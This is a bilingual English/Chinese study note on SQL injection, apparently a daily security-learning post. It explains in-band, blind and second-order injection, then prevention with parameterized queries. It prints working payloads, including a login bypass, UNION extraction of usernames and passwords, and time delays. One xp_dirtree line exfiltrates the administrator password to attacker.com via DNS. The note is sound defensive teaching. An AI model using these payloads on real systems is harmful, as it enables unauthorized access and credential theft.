---
title: "Day 12 — Sql Injection"
date: 2026-07-05
tags:
  - daily
  - security
  - english
description: "- Difficulty: ★★★☆☆ Technical / 技术级"
---

- **Date**: 2026-07-19
- **Difficulty**: ★★★☆☆ (Technical / 技术级)
- **Source**: PortSwigger Web Security Academy + OWASP Foundation
- **Link**: https://portswigger.net/web-security/sql-injection | https://owasp.org/Top10/2025/A05_2025-Injection

> **SQL Injection** (SQL 注入) is a **web security vulnerability** (Web 安全漏洞) that allows an attacker to interfere with the queries an application makes to its database. A single quote character `'` can be enough to change a harmless query into one that exposes, modifies, or deletes data. Today we go beyond the OWASP Top 10 category name and dive into the actual mechanics.

---

## 1. The Core Problem: Data vs. Commands

The root cause of every SQL injection is the same: the application mixes **user-supplied data** (用户输入数据) with **SQL commands** (SQL 命令) using **string concatenation** (字符串拼接). When the database receives the combined string, it cannot tell which parts are instructions and which parts are data — it just executes everything.

Consider this vulnerable Java code:

```java
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

If `input` is `Gifts`, the query works as intended. But if `input` is `Gifts' OR 1=1--`, the query becomes:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

The `--` **comment indicator** (注释指示符) discards everything after it, and `OR 1=1` is always true — so the query returns every row in the table, including unreleased products.

> 中文简释：根本原因就是"数据"和"命令"混在一起，数据库无法区分，于是恶意输入被当作命令执行了。

---

## 2. Three Main Categories of SQL Injection

SQL injection vulnerabilities fall into three broad categories, depending on how the attacker retrieves results:

| Category | Mechanism | Real-World Frequency |
|----------|-----------|---------------------|
| **In-band / Classic** (带内/经典注入) | Attacker uses the same channel to launch the attack and gather results | Most common — easiest to find and exploit |
| **Blind** (盲注) | No data or errors returned directly; attacker infers truth from response differences or time delays | Common in modern apps that suppress errors |
| **Out-of-band (OAST)** (带外注入) | Data is exfiltrated through a different channel (e.g., DNS lookups to attacker-controlled domains) | Less common, but extremely powerful |

> 中文简释：带内注入最常见，盲注靠推理，带外注入通过 DNS 等通道外泄数据。

---

## 3. In-band SQLi: Retrieving Hidden Data

The simplest and most common scenario: an application uses user input in a `WHERE` clause, and the attacker modifies the logic.

**Normal query:**

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Attack payload:** `Gifts' OR 1=1--`

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

The `OR 1=1` makes the condition always true. The `--` comments out the `released = 1` filter. All products — including unreleased ones — are returned.

⚠️ **Danger**: Even if `OR 1=1` seems harmless in a `SELECT`, the same input might reach an `UPDATE` or `DELETE` statement elsewhere, causing **unintended data loss** (意外数据丢失).

> 中文简释：`OR 1=1` 在 SELECT 里看似无害，但如果同一条输入流到了 UPDATE 或 DELETE 语句，可能导致整表数据被改或被删。

---

## 4. In-band SQLi: Subverting Application Logic

A login form is another classic target. The original query:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

**Attack payload:** username = `administrator'--`, password = anything

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

The `--` comments out the password check entirely. The attacker logs in as **administrator** without knowing the password.

> 中文简释：一个 `'--` 就能注释掉密码验证，直接以管理员身份登录——这就是"单引号攻破数据库"的含义。

---

## 5. UNION Attacks: Pulling Data from Other Tables

When an application returns query results in its HTTP response, the attacker can use the **UNION operator** (UNION 运算符) to append an additional `SELECT` query and retrieve data from other tables.

**Two prerequisites for a UNION attack:**

1. The injected and original queries must return the **same number of columns** (相同列数).
2. The **data types** (数据类型) on each column must be compatible between the two queries.

**Step 1 — Determine column count** using `ORDER BY` or `NULL` injection:

```sql
' ORDER BY 1--    (works)
' ORDER BY 2--    (works)
' ORDER BY 3--    (error → 2 columns)
```

Or:

```sql
' UNION SELECT NULL,NULL--          (works → 2 columns)
' UNION SELECT NULL,NULL,NULL--      (error)
```

**Step 2 — Find a column that accepts strings:**

```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

**Step 3 — Extract data:**

```sql
' UNION SELECT username, password FROM users--
```

> 中文简释：UNION 注入三步走：先测列数，再找字符串列位，最后拼接目标表查询。这是最实用的 SQLi 技术之一。

---

## 6. Blind SQL Injection: When You Can't See the Data

Many modern applications suppress error messages and don't display query results directly. In these cases, attackers use **blind SQL injection** (盲注) techniques:

### Boolean-Based Blind Injection

Inject a condition and observe whether the application's response changes:

```sql
TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

If the page shows "Welcome back," the condition is true — the user `administrator` exists.

### Time-Based Blind Injection

Trigger a time delay when a condition is true:

```sql
TrackingId=xyz'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

If the response takes ~5 seconds, the condition is true.

### Out-of-Band (OAST) Blind Injection

Trigger a DNS lookup to an attacker-controlled domain:

```sql
TrackingId=xyz'; EXEC master..xp_dirtree '//attacker.com/'+(SELECT password FROM users WHERE username='administrator')--
```

The password is sent via DNS resolution — no need for any visible response.

> 中文简释：盲注不靠"看"结果，靠"推"结果：布尔看差异、时间看延迟、带外看 DNS。

---

## 7. Second-Order SQL Injection: The Delayed Trap

**Second-order SQL injection** (二阶 SQL 注入 / 存储型注入) is sneaky: the malicious input is stored safely in the database at first, but later retrieved and used unsafely in a different query.

Example: A user registers with username `admin'--`. The application correctly escapes the input during registration and stores the literal string `admin'--`. Later, a password-change function uses this stored username unsafely:

```sql
UPDATE users SET password = 'newpwd' WHERE username = 'admin'--'
```

The `--` comments out the `WHERE` clause condition, and **every user's password gets overwritten**.

> 中文简释：输入时安全地存了，但后续取出来用时没做防注入处理。开发者以为"数据库里的数据是可信的"，这是一个危险假设。

---

## 8. How to Prevent SQL Injection

### Primary Defense: **Parameterized Queries** (参数化查询 / 预编译语句)

The definitive fix is to use **prepared statements** (预编译语句) that keep data and commands separate:

```java
// ✅ Safe — parameterized query
PreparedStatement stmt = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
stmt.setString(1, input);
ResultSet rs = stmt.executeQuery();
```

The `?` placeholder is filled with the user input as a **pure data value** (纯数据值) — it cannot alter the query structure, no matter what the input contains.

### What Parameterized Queries Can and Cannot Cover

| Works ✅ | Doesn't Work ❌ |
|-----------|-----------------|
| Values in `WHERE` clauses | Table names |
| Values in `INSERT` statements | Column names |
| Values in `UPDATE` statements | `ORDER BY` clauses |

For items in the "doesn't work" column, use **allowlist validation** (白名单验证): map user input to a predefined set of safe values.

### Important Caveat on Stored Procedures

Even parameterized **stored procedures** (存储过程) can still be vulnerable if they internally use string concatenation with `EXECUTE IMMEDIATE` or `exec()`.

> 中文简释：参数化查询是治本方案，但表名、列名、ORDER BY 不能用占位符，这些地方要白名单。

### Secondary Defenses (Supplement, Never Replace)

- **Input validation** (输入验证): Whitelist expected patterns on the server side. Not a complete defense — many apps need special characters.
- **Escaping** (转义): Use the specific escape syntax for your DBMS. **Error-prone and fragile** — OWASP explicitly warns against relying on it.
- **WAF** (Web Application Firewall / Web 应用防火墙): Can block common patterns like `' OR 1=1`, but attackers bypass WAF with encoding tricks (e.g., XML entity encoding `&#x53;` for `S` in `SELECT`).
- **Least privilege** (最小权限原则): Restrict database accounts to only the operations they need — no `DROP` or `DELETE` for a read-only app.

> 中文简释：输入验证、转义、WAF 都是补充防线，不能替代参数化查询。最小权限原则能限制注入的破坏范围。

---

## 9. Detection: How to Find SQLi in Your Applications

**Manual testing** for every entry point:

1. Submit a **single quote `'`** and look for errors or anomalies
2. Test **boolean conditions**: `OR 1=1` vs `OR 1=2` — look for response differences
3. Test **time delays**: `WAITFOR DELAY '0:0:5'` — look for response time differences
4. Test **OAST payloads** — monitor for out-of-band interactions

**Automated scanning**: Use **SAST** (Static Application Security Testing / 静态应用安全测试) and **DAST** (Dynamic Application Security Testing / 动态应用安全测试) in your CI/CD pipeline to catch injection flaws before production.

> 中文简释：手工测试四个步骤（引号/布尔/时间/带外），加上 CI/CD 中的 SAST+DAST 自动扫描，双重保障。

---

## Key Terms

| English | 中文 | Note |
|--------|------|------|
| SQL Injection (SQLi) | SQL 注入 | 将恶意 SQL 代码插入用户输入的攻击 |
| String Concatenation | 字符串拼接 | 将数据和命令混合的根本原因 |
| Prepared Statement | 预编译语句 | 参数化查询的核心实现方式 |
| Parameterized Query | 参数化查询 | 用占位符分离数据与命令 |
| In-band Injection | 哨内/经典注入 | 同一通道攻击和获取结果 |
| Blind Injection | 盲注 | 不直接返回结果，需推理判断 |
| Boolean-Based Blind | 布尔盲注 | 通过真/假条件观察响应差异 |
| Time-Based Blind | 时间盲注 | 通过条件延迟观察响应时间 |
| OAST | 带外应用安全测试 | 通过 DNS 等外部通道外泄数据 |
| Second-Order SQLi | 二阶 SQL 注入 | 输入安全存储但后续不安全使用 |
| UNION Attack | UNION 注入 | 用 UNION 运算符拼接额外查询 |
| Comment Indicator | 注释指示符 | `--` 或 `#`，用于截断后续 SQL |
| Allowlist / Whitelist | 白名单 | 只允许预定义的安全输入值 |
| WAF | Web 应用防火墙 | 拦截常见注入模式，但可被绕过 |
| SAST | 静态应用安全测试 | 分析源代码发现漏洞 |
| DAST | 动态应用安全测试 | 对运行中的应用做黑盒测试 |
| Stored Procedure | 存储过程 | 数据库端的预编译程序，仍可被注入 |
| Least Privilege | 最小权限原则 | 限制账户仅拥有必要操作权限 |

---

## 甲方视角思考

- 参数化查询是治本方案，SDL 中应强制 SAST/DAST 规则检测字符串拼接 SQL。
- 二阶注入是最大盲区——内部 API 把"数据库取出的数据"当可信输入，需要和外部输入一样做参数化。
- UNION 注入需要结果回显，盲注不需要——现代应用大多压了报错，盲注才是甲方该优先排查的场景。
- WAF 是纵深防御的一层，但不能替代代码层面的参数化——XML/JSON 编码绕过是常见 WAF 逃逸手法。

---

## 明日预告

**Day 13: XSS (Cross-Site Scripting) — When the Browser Executes the Attacker's Code**  
我们从数据库注入转向浏览器注入，学习 XSS 的三种类型（Reflected / Stored / DOM-based）与防御策略。
